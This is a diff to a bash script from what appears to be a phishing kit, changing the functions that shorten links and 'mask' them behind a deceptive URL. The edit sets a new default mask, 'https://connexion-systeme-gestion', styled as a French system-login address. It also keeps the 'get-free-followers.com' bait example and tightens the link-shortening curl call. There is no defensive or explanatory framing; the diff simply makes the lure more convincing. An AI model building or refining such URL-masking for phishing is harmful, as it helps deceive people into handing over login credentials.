@@ -460,13 +460,12 @@ custom_mask() {
 	echo
 	if [[ ${mask_op,,} == "y" ]]; then
 		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://get-free-followers.com${CYAN})\n"
-		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url
-		if [[ -n "$mask_url" ]]; then
-			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
-		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid input.. Using the Default one.."
-		fi
+		read -e -p "${WHITE} ==> ${ORANGE}" mask_url
+		[[ -z "$mask_url" ]] && mask_url="https://connexion-systeme-gestion" # Default
+		# Clean up double https:// if user pasted over it
+		mask_url=$(echo "$mask_url" | sed 's|^https://https://|https://|')
+		mask=$mask_url
+		echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using custom Masked Url :${GREEN} $mask"
 	fi
 }
 
@@ -474,7 +473,7 @@ custom_mask() {
 site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
 
 shorten() {
-	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	short=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 --max-time 5 "$1$2")
 	if [[ "$1" == *"shrtco.de"* ]]; then
 		processed_url=$(echo ${short} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
 	else
@@ -489,7 +488,7 @@ custom_url() {
 	shortcode="https://api.shrtco.de/v2/shorten?url="
 	tinyurl="https://tinyurl.com/api-create.php?url="
 
-	{ custom_mask; sleep 1; clear; banner_small; }
+	{ custom_mask; banner_small; }
 	
 	raw_url="$url"
 	url="https://$raw_url"
